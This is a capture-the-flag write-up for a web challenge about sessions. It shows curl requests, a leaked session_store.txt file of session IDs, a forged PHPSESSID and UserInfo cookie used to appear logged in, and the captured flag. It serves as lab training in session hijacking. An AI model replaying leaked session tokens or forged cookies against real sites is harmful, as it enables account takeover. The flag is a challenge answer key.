# Description

Flag is restricted to logged users only , can you be one of them.

# Solution
Going into the website.

Welcome to sessions valley You are not logged-in so you don't have any flag to view Flag: NULL

Using curl:
```
╭─ ~ ······························································································································································································· ✔ │  │ 10:23:27 ─╮
╰─ curl http://wlem14nzy24tnzkmkm73p97aqzqw6dv92k74c4zl-web.cybertalentslabs.com/                                                                                                                                         ─╯
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Sessions</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" />

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <script type="text/javascript">
      var cu = null;
    </script>
  </head>
  <body>

    <div class="container">
      <h1>Welcome to sessions valley</h1>
      <hr />
              <h2>You are not logged-in so you don't have any flag to view</h2>
            <h3>Flag: NULL</h3>
    </div>

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
    <script type="text/javascript">

      if(document.cookie !== ''){
        $.post('getcurrentuserinfo.php',{
          'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1]
        },function(data){
          cu = data;
        });
      }
    </script>
  </body>
</html>

```

I got a PHPsessionid so i will add it on my curl

We get a sessions.txt file at http://wlem14nzy24tnzkmkm73p97aqzqw5l3nqnlphq36-web.cybertalentslabs.com/data/session_store.txt

```
iuqwhe23eh23kej2hd2u3h2k23
11l3ztdo96ritoitf9fr092ru3
ksjdlaskjd23ljd2lkjdkasdlk
```

Trying a cookie

```
╭─ ~ ······························································································································································································· ✔ │  │ 11:22:52 ─╮
╰─ curl -H "cookie:PHPSESSID=11l3ztdo96ritoitf9fr092ru3; UserInfo=mary" http://wlem14nzy24tnzkmkm73p97aqzqw6dv92k74c4zl-web.cybertalentslabs.com                                                                          ─╯
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Sessions</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" />

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <script type="text/javascript">
      var cu = null;
    </script>
  </head>
  <body>

    <div class="container">
      <h1>Welcome to sessions valley</h1>
      <hr />
              <h2>You are Loggedin</h2>
            <h3>Flag: sessionareawesomebutifitsecure</h3>
    </div>

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
    <script type="text/javascript">

      if(document.cookie !== ''){
        $.post('getcurrentuserinfo.php',{
          'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1]
        },function(data){
          cu = data;
        });
      }
    </script>
  </body>
</html>
```

# Flag
`Flag: sessionareawesomebutifitsecure`

